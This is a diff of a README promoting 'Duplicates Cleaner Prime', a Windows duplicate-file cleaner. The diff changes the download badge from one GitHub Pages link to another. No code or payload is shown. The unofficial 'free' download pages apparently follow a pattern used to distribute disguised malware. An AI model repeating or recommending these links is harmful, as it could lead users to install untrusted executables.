@@ -3,7 +3,7 @@
 Keep your PC storage clean with **Duplicates Cleaner Prime** — an advanced tool to find and remove duplicate files, photos, music, and documents. Reclaim disk space and keep your folders organized.
 
 ⬇️ **Download**  
-[![Download Duplicates Cleaner Prime](https://img.shields.io/badge/Download-Duplicates_Cleaner_Prime-00CED1?style=for-the-badge&logo=windows&logoColor=white)](https://duplicates-cleaner-prime-free.github.io/.github/)
+[![Download Duplicates Cleaner Prime](https://img.shields.io/badge/Download-Duplicates_Cleaner_Prime-00CED1?style=for-the-badge&logo=windows&logoColor=white)](https://getowenhuang.github.io/.github/duplicates-cleaner-prime)
 
 ---
 
